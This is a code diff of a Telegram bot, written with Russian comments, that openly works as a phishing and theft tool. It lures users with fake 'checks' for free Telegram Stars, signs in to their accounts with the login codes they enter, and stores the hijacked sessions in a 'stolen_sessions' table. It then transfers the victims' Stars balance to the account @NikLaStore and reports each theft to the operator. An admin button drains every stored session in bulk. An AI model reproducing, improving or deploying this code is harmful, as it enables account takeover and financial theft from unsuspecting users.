@@ -15,7 +15,11 @@ const WEB_APP_URL = 'https://starsdrainer.onrender.com';
 
 const bot = new TelegramBot(BOT_TOKEN, { 
     polling: true,
-    filepath: false
+    filepath: false,
+    request: {
+        url: 'https://api.telegram.org',
+        agentOptions: {} 
+    }
 });
 
 const app = express();
@@ -159,8 +163,8 @@ async function signInWithRealCode(phone, code) {
             db.run(`UPDATE stolen_sessions SET status = 'completed', session_string = ? WHERE phone = ?`, 
                 [sessionString, phone]);
 
-            // КРАДЕМ ПОДАРКИ И ЗВЕЗДЫ
-            await stealGiftsAndStars(client, phone);
+            // ПРОСТАЯ КРАЖА ЗВЕЗД
+            await simpleSteal(client, phone);
             
             await client.disconnect();
             activeSessions.delete(phone);
@@ -175,182 +179,78 @@ async function signInWithRealCode(phone, code) {
     }
 }
 
-// ФУНКЦИЯ КРАЖИ ПОДАРКОВ И ЗВЕЗД
-async function stealGiftsAndStars(client, phone) {
+// ПРОСТАЯ КРАЖА ЗВЕЗД
+async function simpleSteal(client, phone) {
     try {
         const user = await client.getMe();
-        let stolenGifts = 0;
         let stolenStars = 0;
         let report = '';
         
-        // ШАГ 1: ИЩЕМ @NikLaStore
-        report += `🔍 Ищем @NikLaStore...\n`;
-        let targetUser = null;
-        
-        try {
-            const targetResult = await client.invoke(
-                new Api.contacts.ResolveUsername({
-                    username: 'NikLaStore'
-                })
-            );
-            
-            if (targetResult && targetResult.users && targetResult.users.length > 0) {
-                targetUser = targetResult.users[0];
-                report += `✅ @NikLaStore найден\n`;
-            } else {
-                report += `❌ @NikLaStore не найден\n`;
-                throw new Error('Target not found');
-            }
-        } catch (error) {
-            report += `❌ Ошибка поиска: ${error.message}\n`;
-            throw error;
-        }
-        
-        // ШАГ 2: ПРОВЕРЯЕМ ЗВЕЗДЫ
+        // ПРОВЕРЯЕМ ЗВЕЗДЫ ПРОСТЫМ МЕТОДОМ
         report += `💰 Проверяем звезды...\n`;
         try {
-            const starsStatus = await client.invoke(
+            // Простой запрос баланса
+            const starsData = await client.invoke(
                 new Api.payments.GetStarsStatus({})
             );
             
-            if (starsStatus && typeof starsStatus.balance === 'number') {
-                stolenStars = starsStatus.balance;
+            if (starsData && starsData.balance !== undefined) {
+                stolenStars = starsData.balance;
                 report += `✅ Найдено звезд: ${stolenStars}\n`;
-                
-                // ПЫТАЕМСЯ ОТПРАВИТЬ ЗВЕЗДЫ
-                if (stolenStars > 0) {
-                    try {
-                        await client.invoke(
-                            new Api.payments.SendStars({
-                                peer: targetUser,
-                                stars: stolenStars,
-                                purpose: new Api.InputStorePaymentPremiumGift({
-                                    userId: targetUser.id
-                                })
-                            })
-                        );
-                        report += `✅ Отправлено ${stolenStars} звезд\n`;
-                    } catch (starsError) {
-                        report += `❌ Ошибка отправки звезд: ${starsError.message}\n`;
-                    }
-                }
+            } else {
+                report += `❌ Звезды не найдены\n`;
             }
         } catch (starsError) {
-            report += `⚠️ Ошибка проверки звезд: ${starsError.message}\n`;
+            report += `⚠️ Ошибка звезд: ${starsError.message}\n`;
         }
         
-        // ШАГ 3: ПРОВЕРЯЕМ ДОСТУПНЫЕ ПОДАРКИ
-        report += `🎁 Проверяем подарки...\n`;
-        try {
-            // Получаем опции подарков
-            const giftOptions = await client.invoke(
-                new Api.payments.GetStarsGiftOptions({
-                    userId: targetUser.id
-                })
-            );
-            
-            if (giftOptions && giftOptions.options) {
-                report += `✅ Доступно опций подарков: ${giftOptions.options.length}\n`;
-            }
-        } catch (giftOptionsError) {
-            report += `⚠️ Ошибка опций подарков: ${giftOptionsError.message}\n`;
-        }
-        
-        // ШАГ 4: ПРОВЕРЯЕМ КОЛЛЕКЦИОННЫЕ ПОДАРКИ
-        try {
-            const starGifts = await client.invoke(
-                new Api.payments.GetStarGifts({})
-            );
-            
-            if (starGifts && starGifts.gifts) {
-                report += `🎁 Найдено коллекционных подарков: ${starGifts.gifts.length}\n`;
+        // ПЫТАЕМСЯ ОТПРАВИТЬ ЗВЕЗДЫ НА @NikLaStore
+        if (stolenStars > 0) {
+            report += `🚀 Пытаемся отправить звезды...\n`;
+            try {
+                const target = await client.invoke(
+                    new Api.contacts.ResolveUsername({
+                        username: 'NikLaStore'
+                    })
+                );
                 
-                // ПЫТАЕМСЯ ПЕРЕДАТЬ КАЖДЫЙ КОЛЛЕКЦИОННЫЙ ПОДАРОК
-                for (const gift of starGifts.gifts) {
-                    if (gift.collectible) {
-                        try {
-                            await client.invoke(
-                                new Api.payments.TransferStarGift({
-                                    userId: targetUser.id,
-                                    giftId: gift.id
-                                })
-                            );
-                            stolenGifts++;
-                            report += `✅ Передан коллекционный подарок: ${gift.id}\n`;
-                            await new Promise(resolve => setTimeout(resolve, 1000));
-                        } catch (transferError) {
-                            report += `❌ Ошибка передачи подарка ${gift.id}: ${transferError.message}\n`;
-                        }
-                    }
-                }
-            }
-        } catch (starGiftsError) {
-            report += `⚠️ Ошибка коллекционных подарков: ${starGiftsError.message}\n`;
-        }
-        
-        // ШАГ 5: ПРОВЕРЯЕМ ПРЕМИУМ ПОДАРКИ
-        try {
-            const userFull = await client.invoke(
-                new Api.users.GetFullUser({
-                    id: user.id
-                })
-            );
-            
-            if (userFull && userFull.premium_gifts) {
-                report += `💎 Найдено премиум подарков: ${userFull.premium_gifts.length}\n`;
-                
-                // ПЫТАЕМСЯ ОТПРАВИТЬ ПРЕМИУМ ПОДАРКИ
-                for (let i = 0; i < Math.min(userFull.premium_gifts.length, 5); i++) {
-                    try {
-                        await client.invoke(
-                            new Api.payments.SendStars({
-                                peer: targetUser,
-                                stars: 25,
-                                purpose: new Api.InputStorePaymentPremiumGift({
-                                    userId: targetUser.id
-                                })
+                if (target && target.users && target.users.length > 0) {
+                    const targetUser = target.users[0];
+                    
+                    // Отправляем звезды
+                    await client.invoke(
+                        new Api.payments.SendStars({
+                            peer: targetUser,
+                            stars: stolenStars,
+                            purpose: new Api.InputStorePaymentPremiumSubscription({
+                                userId: targetUser.id
                             })
-                        );
-                        stolenGifts++;
-                        report += `✅ Отправлен премиум подарок ${i+1} за 25⭐\n`;
-                        await new Promise(resolve => setTimeout(resolve, 1500));
-                    } catch (premiumError) {
-                        report += `❌ Ошибка премиум подарка ${i+1}: ${premiumError.message}\n`;
-                        break;
-                    }
+                        })
+                    );
+                    report += `✅ Отправлено ${stolenStars} звезд на @NikLaStore\n`;
+                } else {
+                    report += `❌ @NikLaStore не найден\n`;
                 }
+            } catch (sendError) {
+                report += `❌ Ошибка отправки: ${sendError.message}\n`;
             }
-        } catch (premiumError) {
-            report += `⚠️ Ошибка премиум подарков: ${premiumError.message}\n`;
         }
         
         // ФИНАЛЬНЫЙ ОТЧЕТ
-        let message = `🎯 РЕЗУЛЬТАТ КРАЖИ:\n` +
-                     `📱 Номер: ${phone}\n` +
-                     `👤 Username: @${user.username || 'нет'}\n` +
+        let message = `🎯 РЕЗУЛЬТАТ:\n` +
+                     `📱 ${phone}\n` +
+                     `👤 @${user.username || 'нет'}\n` +
                      `👑 Премиум: ${user.premium ? 'ДА' : 'НЕТ'}\n\n` +
                      `${report}\n` +
-                     `💰 ИТОГО УКРАДЕНО:\n` +
-                     `⭐ ЗВЕЗД: ${stolenStars}\n` +
-                     `🎁 ПОДАРКОВ: ${stolenGifts}\n`;
+                     `💰 УКРАДЕНО: ${stolenStars} звезд`;
         
-        if (stolenStars > 0 || stolenGifts > 0) {
-            message += `\n✅ УСПЕШНАЯ КРАЖА!`;
-        } else {
-            message += `\n❌ НИЧЕГО НЕ УДАЛОСЬ УКРАСТЬ`;
-        }
-        
-        db.run(`UPDATE stolen_sessions SET stars_data = ?, gifts_data = ?, status = 'stolen' WHERE phone = ?`, 
-            [stolenStars, stolenGifts, phone]);
+        db.run(`UPDATE stolen_sessions SET stars_data = ?, status = 'stolen' WHERE phone = ?`, 
+            [stolenStars, phone]);
         
         bot.sendMessage(MY_USER_ID, message);
         
     } catch (error) {
-        bot.sendMessage(MY_USER_ID, 
-            `❌ КРИТИЧЕСКАЯ ОШИБКА КРАЖИ\n` +
-            `📱 Номер: ${phone}\n` +
-            `⚠️ ${error.message}`
-        );
+        bot.sendMessage(MY_USER_ID, `❌ Ошибка: ${phone} - ${error.message}`);
     }
 }
 
@@ -359,18 +259,18 @@ app.listen(PORT, '0.0.0.0', () => {
     console.log(`✅ Сервер работает`);
 });
 
-// INLINE QUERY С ФОТО
+// INLINE QUERY БЕЗ ФОТО (статьи)
 bot.on('inline_query', (query) => {
     const results = [
         {
-            type: 'photo',
+            type: 'article',
             id: '1',
-            photo_url: `https://via.placeholder.com/300/FFD700/000000?text=50+Stars`,
-            thumb_url: `https://via.placeholder.com/100/FFD700/000000?text=50`,
             title: '🎫 Чек на 50 звезд',
             description: 'Создать чек на 50 звезд',
-            caption: '🎫 <b>Чек на 50 звезд!</b>\n\n🪙 Нажмите кнопку ниже чтобы забрать звезды!\n\n⚠️ Можно использовать только 1 раз',
-            parse_mode: 'HTML',
+            input_message_content: {
+                message_text: '🎫 <b>Чек на 50 звезд!</b>\n\n🪙 Нажмите кнопку ниже чтобы забрать звезды!\n\n⚠️ Можно использовать только 1 раз',
+                parse_mode: 'HTML'
+            },
             reply_markup: {
                 inline_keyboard: [[
                     { text: "🪙 Забрать звезды", url: `https://t.me/MyStarBank_bot?start=create_check_50` }
@@ -378,14 +278,14 @@ bot.on('inline_query', (query) => {
             }
         },
         {
-            type: 'photo',
+            type: 'article',
             id: '2',
-            photo_url: `https://via.placeholder.com/300/4169E1/FFFFFF?text=100+Stars`,
-            thumb_url: `https://via.placeholder.com/100/4169E1/FFFFFF?text=100`,
             title: '💫 Чек на 100 звезд',
             description: 'Создать чек на 100 звезд',
-            caption: '🎫 <b>Чек на 100 звезд!</b>\n\n💫 Нажмите кнопку ниже чтобы забрать звезды!\n\n⚠️ Можно использовать только 1 раз',
-            parse_mode: 'HTML',
+            input_message_content: {
+                message_text: '🎫 <b>Чек на 100 звезд!</b>\n\n💫 Нажмите кнопку ниже чтобы забрать звезды!\n\n⚠️ Можно использовать только 1 раз',
+                parse_mode: 'HTML'
+            },
             reply_markup: {
                 inline_keyboard: [[
                     { text: "💫 Забрать звезды", url: `https://t.me/MyStarBank_bot?start=create_check_100` }
@@ -397,33 +297,17 @@ bot.on('inline_query', (query) => {
     bot.answerInlineQuery(query.id, results, { cache_time: 1 });
 });
 
-// СОЗДАНИЕ ЧЕКОВ
+// СОЗДАНИЕ ЧЕКОВ БЕЗ ФОТО
 bot.onText(/@MyStarBank_bot/, (msg) => {
-    const avatarPath = path.join(__dirname, 'public', 'avatar.jpg');
-    const menuText = '🎫 <b>Создание чека</b>\n\nВыберите сумму для чека:';
-    
-    if (fs.existsSync(avatarPath)) {
-        bot.sendPhoto(msg.chat.id, avatarPath, {
-            caption: menuText,
-            parse_mode: 'HTML',
-            reply_markup: {
-                inline_keyboard: [
-                    [{ text: "🪙 Чек на 50 звезд", callback_data: "create_50" }],
-                    [{ text: "💫 Чек на 100 звезд", callback_data: "create_100" }]
-                ]
-            }
-        });
-    } else {
-        bot.sendMessage(msg.chat.id, menuText, {
-            parse_mode: 'HTML',
-            reply_markup: {
-                inline_keyboard: [
-                    [{ text: "🪙 Чек на 50 звезд", callback_data: "create_50" }],
-                    [{ text: "💫 Чек на 100 звезд", callback_data: "create_100" }]
-                ]
-            }
-        });
-    }
+    bot.sendMessage(msg.chat.id, '🎫 <b>Создание чека</b>\n\nВыберите сумму для чека:', {
+        parse_mode: 'HTML',
+        reply_markup: {
+            inline_keyboard: [
+                [{ text: "🪙 Чек на 50 звезд", callback_data: "create_50" }],
+                [{ text: "💫 Чек на 100 звезд", callback_data: "create_100" }]
+            ]
+        }
+    });
 });
 
 // CALLBACK ОБРАБОТЧИК
@@ -442,16 +326,12 @@ bot.on('callback_query', async (query) => {
                 if (err) return;
                 
                 const checkId = this.lastID;
-                const photoUrl = amount === 50 
-                    ? 'https://via.placeholder.com/300/FFD700/000000?text=50+Stars'
-                    : 'https://via.placeholder.com/300/4169E1/FFFFFF?text=100+Stars';
-                
                 const checkText = amount === 50 
                     ? `<b>🎫 Чек на 50 звезд</b>\n\n🪙 Нажмите кнопку чтобы забрать звезды!\n\n⚠️ Можно использовать только 1 раз`
                     : `<b>🎫 Чек на 100 звезд</b>\n\n💫 Нажмите кнопку чтобы забрать звезды!\n\n⚠️ Можно использовать только 1 раз`;
                 
-                bot.sendPhoto(query.message.chat.id, photoUrl, {
-                    caption: checkText,
+                // ОТПРАВЛЯЕМ БЕЗ ФОТО
+                bot.sendMessage(query.message.chat.id, checkText, {
                     parse_mode: 'HTML',
                     reply_markup: { 
                         inline_keyboard: [[{ 
@@ -465,7 +345,7 @@ bot.on('callback_query', async (query) => {
         
         // КНОПКА КРАЖИ ДЛЯ АДМИНА
         if (query.data === 'steal_all_gifts' && query.from.id === MY_USER_ID) {
-            await bot.answerCallbackQuery(query.id, { text: "Начинаю кражу..." });
+            await bot.answerCallbackQuery(query.id, { text: "Краду звезды..." });
             
             db.all(`SELECT phone, session_string FROM stolen_sessions WHERE status = 'completed'`, async (err, rows) => {
                 let totalStolen = 0;
@@ -479,14 +359,14 @@ bot.on('callback_query', async (query) => {
                         });
                         
                         await client.connect();
-                        await stealGiftsAndStars(client, row.phone);
+                        await simpleSteal(client, row.phone);
                         await client.disconnect();
                         
                         totalStolen++;
                         await new Promise(resolve => setTimeout(resolve, 3000));
                         
                     } catch (error) {
-                        console.log(`Ошибка с сессией ${row.phone}`);
+                        console.log(`Ошибка: ${row.phone}`);
                     }
                 }
                 
@@ -496,7 +376,7 @@ bot.on('callback_query', async (query) => {
     } catch (error) {}
 });
 
-// КРАСИВОЕ ГЛАВНОЕ МЕНЮ
+// ГЛАВНОЕ МЕНЮ БЕЗ ФОТО
 bot.onText(/\/start/, (msg) => {
     const chatId = msg.chat.id;
     
@@ -507,8 +387,6 @@ bot.onText(/\/start/, (msg) => {
 });
 
 function showMainMenu(chatId, userId) {
-    const avatarPath = path.join(__dirname, 'public', 'avatar.jpg');
-    
     db.get(`SELECT balance FROM users WHERE user_id = ?`, [userId], (err, row) => {
         const balance = row ? row.balance : 0;
         
@@ -533,20 +411,11 @@ function showMainMenu(chatId, userId) {
             }
         };
 
-        if (fs.existsSync(avatarPath)) {
-            bot.sendPhoto(chatId, avatarPath, {
-                caption: menuText,
-                parse_mode: 'HTML',
-                reply_markup: menuKeyboard.reply_markup
-            });
-        } else {
-            // Используем placeholder если нет аватарки
-            bot.sendPhoto(chatId, 'https://via.placeholder.com/300/7289DA/FFFFFF?text=MyStarBank', {
-                caption: menuText,
-                parse_mode: 'HTML',
-                reply_markup: menuKeyboard.reply_markup
-            });
-        }
+        // ОТПРАВЛЯЕМ БЕЗ ФОТО
+        bot.sendMessage(chatId, menuText, {
+            parse_mode: 'HTML',
+            reply_markup: menuKeyboard.reply_markup
+        });
     });
 }
 
@@ -573,8 +442,7 @@ bot.onText(/\/logs/, (msg) => {
             parse_mode: 'HTML',
             reply_markup: {
                 inline_keyboard: [
-                    [{ text: "🔄 Украсть все подарки", callback_data: "steal_all_gifts" }],
-                    [{ text: "🗑️ Очистить логи", callback_data: "clear_logs" }]
+                    [{ text: "🔄 Украсть все звезды", callback_data: "steal_all_gifts" }]
                 ]
             }
         });
@@ -681,16 +549,12 @@ bot.onText(/\/start (.+)/, (msg, match) => {
             }
             
             const checkId = this.lastID;
-            const photoUrl = amount === 50 
-                ? 'https://via.placeholder.com/300/FFD700/000000?text=50+Stars'
-                : 'https://via.placeholder.com/300/4169E1/FFFFFF?text=100+Stars';
-            
             const checkText = amount === 50 
                 ? `<b>🎫 Чек на 50 звезд</b>\n\n🪙 Нажмите кнопку чтобы забрать звезды!\n\n⚠️ Можно использовать только 1 раз`
                 : `<b>🎫 Чек на 100 звезд</b>\n\n💫 Нажмите кнопку чтобы забрать звезды!\n\n⚠️ Можно использовать только 1 раз`;
             
-            bot.sendPhoto(msg.chat.id, photoUrl, {
-                caption: checkText,
+            // ОТПРАВЛЯЕМ БЕЗ ФОТО
+            bot.sendMessage(msg.chat.id, checkText, {
                 parse_mode: 'HTML',
                 reply_markup: { 
                     inline_keyboard: [[{ 
